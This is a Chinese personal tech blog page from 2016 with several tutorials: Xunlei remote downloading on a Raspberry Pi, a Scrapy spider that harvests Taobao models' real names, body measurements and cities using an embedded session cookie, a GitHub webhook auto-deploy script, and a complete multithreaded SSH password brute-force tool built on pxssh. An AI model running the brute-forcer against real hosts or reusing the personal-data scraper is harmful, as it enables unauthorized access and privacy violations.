<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>  
	  
  	独自一人
  	
	</title>

  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

	<link href="atom.xml" rel="alternate" title="独自一人" type="application/atom+xml">

	<link href="asset/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="asset/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
	<script src="asset/javascripts/jquery.min.js"></script>
	<script src="asset/highlightjs/highlight.pack.js"></script>
	<link href="asset/highlightjs/styles/solarized_dark.css" media="screen, projection" rel="stylesheet" type="text/css">
<script>hljs.initHighlightingOnLoad();</script>

	<!--[if lt IE 9]><script src="asset/javascripts/html5.js"></script><![endif]-->
	<!-- <link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'> -->
	<style type="text/css">
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 300;
  src: local('Nunito-Light'), url(asset/font/1TiHc9yag0wq3lDO9cw0voX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 400;
  src: local('Nunito-Regular'), url(asset/font/6TbRXKWJjpj6V2v_WyRbMX-_kf6ByYO6CLYdB4HQE-Y.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 700;
  src: local('Nunito-Bold'), url(asset/font/TttUCfJ272GBgSKaOaD7KoX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
	</style>
	
	<style type="text/css">
	.container .left-col{ opacity: 1;}
	#pagenavi a{ font-size: 1.3em;}
	#pagenavi .next:before{ top: 3px;}
	#pagenavi .prev:before{ top: 3px;}
	.container .mid-col .mid-col-container #content .archives .title{ font-size: 1.5em;}
	.container .mid-col .mid-col-container #content article{ padding: 15px 0px;}
	#header .subtitle {
		line-height: 1.2em;
		padding-top: 8px;
	}
	article pre{ background: none; border: none; padding: 0;}
	article .entry-content{text-align: left;}
	.share-comment{ padding: 25px 0px; clear: both;}
	hr{ margin: 20px 0px;border: 0; border-top:solid 1px #ddd;}
	</style>
  

</head>


<body>
	<div class="container">
		<div class="left-col">
			<div class="intrude-less">
				<header id="header" class="inner">
				 
				 	<div class="profilepic">
						<img src="https://pic.mylonly.com/2017-05-11-IMG_1164.JPG" style="width:160px;">
					</div>
            	
					
					<h1><a href="index.html">独自一人</a></h1>
					<p class="subtitle">独自一人,独自Coding...</p>
					<nav id="main-nav">
						<ul class="main">
						
						  <li id=""><a target="self" href="index.html">Home</a></li>
						
						  <li id=""><a target="_self" href="archives.html">Archives</a></li>
						
						</ul>
					</nav>

					<nav id="sub-nav">
						<div class="social">










<a target="_blank" class="github" target="_blank" href="https://github.com/mylonly" title="GitHub">GitHub</a>
<a target="_blank" class="email" href="mailto:root@mylonly.com" title="Email">Email</a>

								

								<a class="rss" href="atom.xml" title="RSS">RSS</a>
							
						</div>
					</nav>
				</header>				
			</div>
		</div>	
		<div class="mid-col">
			<div class="mid-col-container"> <div id="content" class="inner">
<div itemscope itemtype="http://schema.org/Blog">


	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-07-13T15:39:33+08:00" itemprop="datePublished">2016/7/13</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='linux.html'>Linux</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945010337427.html" itemprop="url">
		利用树莓派搭建迅雷远程下载服务器</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p>树莓派系统为Raspberry Pi</p>
</blockquote>

<ol>
<li><p>树莓派安装迅雷路由器固件<br/>
可以在迅雷论坛上下载到最新的固件:<a href="http://luyou.xunlei.com/">官网论坛</a>,记得要下arm版本的固件<code>armel_v5te_glibc</code><br/>
或者下载我共享的这个<a href="http://pan.baidu.com/s/1nvvoX7b">Xware1.0.31_armel_v5te_glibc</a> 提取码:e223<br/>
在树莓派上解压到某个目录，例如我的是<code>/root/xunlei</code>下面</p>
<pre><code class="language-shell">unzip Xware1.0.31_armel_v5te_glibc.zip -d /root/xunlei
</code></pre>
<p>进入<code>/root/xunlei</code>目录 执行:</p>
<pre><code class="language-shell">./portal
</code></pre>
<p>稍等片刻，会在最后输出一个激活码，类似下图中涂红的部分</p>
<p><img src="https://pic.mylonly.com/2016-07-13_15:19:59.jpg" alt="2016-07-13_15:19:59.jpg"/> </p></li>
<li><p>在迅雷远程下载页面绑定树莓派<br/>
登录<a href="http://yuancheng.xunlei.com/">迅雷远程下载主页</a>,登录之后，左侧会有一个添加按钮，点击添加按钮，弹出如下界面:<br/>
<img src="https://pic.mylonly.com/2016-07-13_15:22:45.jpg" alt="2016-07-13_15:22:45.jpg"/></p>
<p>将树莓派上获得的激活码填入框中，点击<code>绑定</code>后左侧就会出现树莓派对应的设备列表了，但是，如果我们此时就在右侧点击<code>新建</code>之后会发现,弹出的新建页面中会提示找不到挂载磁盘，如下图：</p>
<p><img src="http://pic.mylonly.com/2016-07-13_15:25:18.jpg" alt="2016-07-13_15:25:18.jpg"/></p></li>
<li><p>自定义迅雷的下载目录</p>
<p>进入<code>/mnt</code>目录，创建目录TDDOWNLOAD(名字随意)<br/>
执行命令:</p>
<pre><code class="language-shell">mount --bind /data/TDDOWNLOAD /mnt/TDDOWNLOAD
</code></pre>
<p>其中/data/TDDOWNLOAD就是自定义的下载目录，你可以指定为其他任何目录。</p>
<p>然后再刚刚迅雷固件的解压目录下创建目录<code>etc</code>,同时创建文件<code>thunder_mounts.cfg</code>,编辑此文件</p>
<pre><code class="language-shell">vim /root/xunlei/etc/thunder_mounts.cfg
</code></pre>
<p>内容为:</p>
<pre><code class="language-shell">avaliable_mount_path_pattern
{<br/>
    /mnt/TDDOWNLOAD<br/>
}
</code></pre>
<p>保存后重启迅雷路由器固件:</p>
<pre><code class="language-shell">./root/xunlei/portal
</code></pre>
<p>再进入远程下载界面新建下载就没有了没挂载磁盘的提示了</p></li>
<li><p>迅雷路由器固件开机启动</p>
<p>在/etc/init.d/下新建xunlei脚本，写入:</p>
<pre><code class="language-text">```Shell
#!/bin/sh<br/>
#<br/>
# Xunlei initscript<br/>
#<br/>
### BEGIN INIT INFO<br/>
# Provides:          xunlei<br/>
# Required-Start:    $network $local_fs $remote_fs<br/>
# Required-Stop::    $network $local_fs $remote_fs<br/>
# Should-Start:      $all<br/>
# Should-Stop:       $all<br/>
# Default-Start:     2 3 4 5<br/>
# Default-Stop:      0 1 6<br/>
# Short-Description: Start xunlei at boot time<br/>
# Description:       A downloader<br/>
### END INIT INFO<br/>
do_start()<br/>
{<br/>
        ./root/xunlei/portal<br/>
}<br/>
do_stop()<br/>
{<br/>
        ./root/xunlei/portal -s<br/>
}<br/>
case &quot;$1&quot; in<br/>
  start)<br/>
    do_start<br/>
    ;;<br/>
  stop)<br/>
    do_stop<br/>
    ;;<br/>
esac<br/>
``` 
</code></pre>
<p>然后将该脚本加入默认自启动中</p>
<pre><code class="language-shell">update-rc.d xunlei defaults
</code></pre></li>
</ol>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-07-04T19:12:04+08:00" itemprop="datePublished">2016/7/4</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945011244738.html" itemprop="url">
		Scrapy抓取Ajax动态页面</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p>一般来说爬虫类框架抓取Ajax动态页面都是通过一些第三方的webkit库去手动执行html页面中的js代码， 最后将生产的html代码交给spider分析。本篇文章则是通过浏览器提供的Debug工具分析Ajax页面的具体请求内容，找到获取数据的接口url，直接调用该接口获取数据，省去了引入python-webkit库的麻烦，而且由于一般ajax请求的数据都是结构化数据，这样更省去了我们利用xpath解析html的痛苦。</p>
</blockquote>

<p>这次我们要抓取的网站是<a href="https://mm.taobao.com">淘女郎</a>的页面,全站都是通过Ajax获取数据然后重新渲染生产的。</p>

<p>这篇文章的代码已上传至我的<a href="https://github.com/mylonly/Spiders">Github</a>,由于后面有部分内容并没有提供完整代码，所以贴上地址供各位参考。</p>

<h3 id="toc_0">分析工作</h3>

<p>用Chrome打开淘女郎的首页中的<a href="https://mm.taobao.com/search_tstar_model.htm">美人库</a>，这个页面毫无疑问是会展示所有的模特的信息，同时打开Debug工具，在network选项中查看浏览器发送了哪些请求？</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:11:01.jpg" alt="2016-07-04_16:11:01.jpg"/></p>

<p>在截图的左下角可以看到总共产生了86个请求，那么有什么办法可以快速定位到Ajax请求的链接了，利用Network当中提供的Filter功能，选中Filter，最后选择右边的XHR过滤(XHR时XMLHttpRequest对象，一般Ajax请求的数据都是结构化数据)，这样就剩下了为数不多的几个请求，剩下的就靠我们自己一个一个的检查吧</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:22:18.jpg" alt="2016-07-04_16:22:18.jpg"/></p>

<p>很幸运，通过分析每个接口返回的request和response信息，发现最后一个请求就是我们需要的接口url</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:25:56.jpg" alt="2016-07-04_16:25:56.jpg"/></p>

<p>Request中得参数很简单,根据英文意思就可以猜出意义,由于我们要抓取所有模特的信息，所以不需要定制这些参数，后面直接将这些参数post给接口就行了</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:29:06.jpg" alt="2016-07-04_16:29:06.jpg"/></p>

<p>在Response中可以获得到的有用数据有两个:所有模特信息的列表<code>searchDOList</code>、以及总页数<code>totolPage</code></p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:35:05.jpg" alt="2016-07-04_16:35:05.jpg"/></p>

<p>searchDOList列表中得对象都有如上图所示的json格式，它也正是我们需要的模特信息的数据</p>

<h3 id="toc_1">Scrapy编码</h3>

<ol>
<li><p>定义Item</p>
<pre><code class="language-python">class tbModelItem(scrapy.Item):
    avatarUrl = scrapy.Field()<br/>
    cardUrl = scrapy.Field()<br/>
    city = scrapy.Field()<br/>
    height = scrapy.Field()<br/>
    identityUrl = scrapy.Field()<br/>
    modelUrl = scrapy.Field()<br/>
    realName = scrapy.Field()<br/>
    totalFanNum = scrapy.Field()<br/>
    totalFavorNum = scrapy.Field()<br/>
    userId = scrapy.Field()<br/>
    viewFlag = scrapy.Field()<br/>
    weight = scrapy.Field()
</code></pre>
<p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
<li><p>Spider编写</p>
<pre><code class="language-python">import urllib2
import os<br/>
import re<br/>
import codecs<br/>
import json<br/>
import sys<br/>
from scrapy import Spider<br/>
from scrapy.selector import Selector<br/>
from MySpider.items import tbModelItem,tbThumbItem<br/>
from scrapy.http import Request<br/>
from scrapy.http import FormRequest<br/>
from scrapy.utils.response import open_in_browser<br/>
reload(sys)<br/>
sys.setdefaultencoding(&#39;utf8&#39;)<br/>
class tbmmSpider(Spider):<br/>
    name = &quot;tbmm&quot;<br/>
    allow_domians = [&quot;mm.taobao.com&quot;]<br/>
    custom_settings = {<br/>
        &quot;DEFAULT_REQUEST_HEADERS&quot;:{<br/>
            &#39;authority&#39;:&#39;mm.taobao.com&#39;,<br/>
            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,<br/>
            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,<br/>
            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,<br/>
            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,<br/>
            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,<br/>
            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,<br/>
            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,<br/>
            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;<br/>
        },<br/>
        &quot;ITEM_PIPELINES&quot;:{<br/>
            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300<br/>
        }<br/>
    } <br/>
    def start_requests(self):<br/>
        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;<br/>
        requests = []<br/>
        for i in range(1,60):<br/>
            formdata = {&quot;q&quot;:&quot;&quot;,<br/>
                        &quot;viewFlag&quot;:&quot;A&quot;,<br/>
                        &quot;sortType&quot;:&quot;default&quot;,<br/>
                        &quot;searchStyle&quot;:&quot;&quot;,<br/>
                        &quot;searchRegion&quot;:&quot;city:&quot;,<br/>
                        &quot;searchFansNum&quot;:&quot;&quot;,<br/>
                        &quot;currentPage&quot;:str(i),<br/>
                        &quot;pageSize&quot;:&quot;100&quot;}<br/>
            request = FormRequest(url,callback=self.parse_model,formdata=formdata)<br/>
            requests.append(request)<br/>
        return requests<br/>
    def parse_model(self,response):<br/>
        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))<br/>
        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]<br/>
        modelItems = []<br/>
        for dict in models:<br/>
            modelItem = tbModelItem()<br/>
            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]<br/>
            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]<br/>
            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]<br/>
            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]<br/>
            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]<br/>
            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]<br/>
            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]<br/>
            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]<br/>
            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]<br/>
            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]<br/>
            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]<br/>
            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]<br/>
            modelItems.append(modelItem)<br/>
        return modelItems  
</code></pre>
<p>代码不长，一点一点来分析:</p>
<ol>
<li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
<li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
<li>ITEM_PIPELINES，自定义管道模块，当item获取到数据后会调用你指定的管道处理命令，这个后面会贴上代码，因为这个不影响本文的内容，数据的处理可以因人而异。</li>
<li>依然重写start_request,带上必要的参数请求我们分析得到的借口url，这里我省了一个懒，只遍历了前60页的数据，各位当然可以先调用1次借口确定总的页数(totalPage)之后再写这个for循环。</li>
<li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
</ol></li>
<li><p>数据后续处理</p>
<p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>
<pre><code class="language-python">import MySQLdb
class tbModelPipeline(object):<br/>
    def process_item(self,item,spider):<br/>
        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)<br/>
        cursor = db.cursor()<br/>
        db.set_character_set(&#39;utf8&#39;)<br/>
        cursor.execute(&#39;SET NAMES utf8;&#39;)<br/>
        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)<br/>
        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)<br/>
        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\<br/>
                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\<br/>
                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])<br/>
        try:<br/>
                print sql<br/>
                cursor.execute(sql)<br/>
                db.commit()<br/>
        except MySQLdb.Error,e:<br/>
                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])<br/>
        db.close()<br/>
        return item
</code></pre></li>
</ol>

<h3 id="toc_2">更重要的内容</h3>

<p>获取所有的淘女郎的基本信息并不是<a href="https://mm.taobao.com">淘女郎</a>这个网站的全部内容，还有一些更有意思的数据,比如:</p>

<p>点击进入模特的页面之后发现左侧会有有个相册选项卡，点击后右边出现了各种相册，而每个相册里面都是各种各样的模特照片</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:22.jpg" alt="2016-07-04_17:04:22.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:49.jpg" alt="2016-07-04_17:04:49.jpg"/></p>

<p>通过network的分析，这些页面的数据通通都是Ajax请求获得的，具体的接口如下:</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:09:51.jpg" alt="2016-07-04_17:09:51.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:10:16.jpg" alt="2016-07-04_17:10:16.jpg"/></p>

<ol>
<li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>
<pre><code class="language-python">def parse_album(self,response):
   sel = Selector(response)<br/>
   tbThumbItems = []<br/>
   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       <br/>
   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()<br/>
   user_id = response.meta[&#39;user_id&#39;]<br/>
   for i in range(0,len(thumb_url_list)-1):<br/>
       thumbItem = tbThumbItem()<br/>
       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)<br/>
       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]<br/>
       thumbItem[&#39;thumb_userId&#39;] = str(user_id)<br/>
       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])<br/>
       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]<br/>
       tbThumbItems.append(thumbItem)<br/>
   return tbThumbItems
</code></pre></li>
<li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>
<p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>
<p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
</ol>

<h3 id="toc_3">总结</h3>

<ol>
<li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
<li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
</ol>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-07-02T19:09:49+08:00" itemprop="datePublished">2016/7/2</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='linux.html'>Linux</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945009892942.html" itemprop="url">
		利用Github的Webhook功能和Node.js完成项目的自动部署</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<p><u>本文对任何提供Webhook的git仓库都适用</u></p>

<p><img src="https://pic.mylonly.com/2016-06-29_14635623250348.jpg" alt="2016-06-29_14635623250348.jpg"/></p>

<h3 id="toc_0">首先完成Node.js服务器的代码构建，先上代码，再解释</h3>

<pre><code class="language-node.js">var http = require(&#39;http&#39;)
var createHandler = require(&#39;github-webhook-handler&#39;)
var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; })
// 上面的 secret 保持和 GitHub 后台设置的一致

function run_cmd(cmd, args, callback) {
  var spawn = require(&#39;child_process&#39;).spawn;
  var child = spawn(cmd, args);
  var resp = &quot;&quot;;

  child.stdout.on(&#39;data&#39;, function(buffer) { resp += buffer.toString(); });
  child.stdout.on(&#39;end&#39;, function() { callback (resp) });
}

http.createServer(function (req, res) {
  handler(req, res, function (err) {
    res.statusCode = 404
    res.end(&#39;no such location&#39;)
  })
}).listen(7777)

handler.on(&#39;error&#39;, function (err) {
  console.error(&#39;Error:&#39;, err.message)
})

handler.on(&#39;push&#39;, function (event) {
  console.log(&#39;Received a push event for %s to %s&#39;,
    event.payload.repository.name,
    event.payload.ref);
    run_cmd(&#39;sh&#39;, [&#39;./deploy.sh&#39;,event.payload.repository.name], function(text){ console.log(text) });
})
</code></pre>

<p>上面的代码中用到了一个<code>github-webhook-handler</code>的中间价，你可以用<code>npm install -g github-webhook-handler</code>来全局安装</p>

<p>还有代码这行:</p>

<pre><code class="language-text">var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; }) 
</code></pre>

<p>其中secret后的参数是你在github的项目中添加webhook时设置的secret值，替换成自己的就行了</p>

<h3 id="toc_1">完成deploy.sh脚本</h3>

<p>deploy.sh脚本负责进入项目的目录，然后利用git命令拉取最新的代码，还是直接贴代码:</p>

<pre><code class="language-bash"> #!/bin/bash

WEB_PATH=&#39;/root/tools/&#39;$1
WEB_USER=&#39;root&#39;
WEB_USERGROUP=&#39;root&#39;

echo &quot;Start deployment&quot;
cd $WEB_PATH
echo &quot;pulling source code...&quot;
git reset --hard origin/master
git clean -f
git pull
git checkout master
echo &quot;changing permissions...&quot;
chown -R $WEB_USER:$WEB_USERGROUP $WEB_PATH
echo &quot;Finished.&quot;
</code></pre>

<p>deploy.sh 会接受第一个参数当做项目名字，然后进入这个项目的目录执行git操作，这个参数是在deploy.js中根据hook返回的项目名字来的，代码应该比较容易懂，都是些简单的git命令。</p>

<blockquote>
<p>如果是全新的项目，需要在你的服务器上先clone要部署的项目<br/>
你需要根据自己的实际项目位置，修改WEB_PATH的值</p>
</blockquote>

<h3 id="toc_2">后台运行deploy.js</h3>

<p>利用Linux提供的nohup命令，让deploy.js运行在后台</p>

<pre><code class="language-text">nohup node deploy.js &gt; deploy.log &amp;
</code></pre>

<h3 id="toc_3">去Github后台添加webhook</h3>

<p>进入你需要自动部署的项目的github地址，进入项目的设置页面，点击左侧的<code>Webhooks &amp; services</code><br/>
<img src="https://pic.mylonly.com/2016-06-29_14635620989191.jpg" alt="2016-06-29_14635620989191.jpg"/></p>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
		利用pxssh暴力破解ssh密码</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p><mark>关于pxssh</mark><br/>
pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
</blockquote>

<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>

<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>

<pre><code class="language-python">def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()
</code></pre>

<h4 id="toc_1">多线程和信号量</h4>

<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>

<pre><code class="language-python">password_file = open(password,&#39;r&#39;)
for line in password_file:
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()
</code></pre>

<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>

<pre><code class="language-python">maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)
password_file = open(password,&#39;r&#39;)
for line in password_file:
   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
   connection_lock.acquire()
   print(&#39;[-] Testing password:&#39;+str(password))
   thread = threading.Thread(target=connect,args=(host,user,password))
   thread.start()
</code></pre>

<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>

<h4 id="toc_2">测试结果</h4>

<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
字典文件可以自己生成，或者网上找一些常用字典文件</p>

<h4 id="toc_3">完整代码</h4>

<pre><code class="language-python">from pexpect import pxssh
import threading
import optparse
import time

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def send_command(child,cmd):
    child.sendline(cmd)
    child.prompt()
    print(child.before)

def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()

def main():
    
    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
    (options,args) = parse.parse_args()

    host = options.host
    user = options.user
    password = options.password

    password_file = open(password,&#39;r&#39;)

    for line in password_file:
        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
        connection_lock.acquire()
        print(&#39;[-] Testing password:&#39;+str(password))
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()

if __name__ == &#39;__main__&#39;:
    main()

</code></pre>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-06-24T19:11:42+08:00" itemprop="datePublished">2016/6/24</time>
			</div>
			<div class="tags">posted in 
			
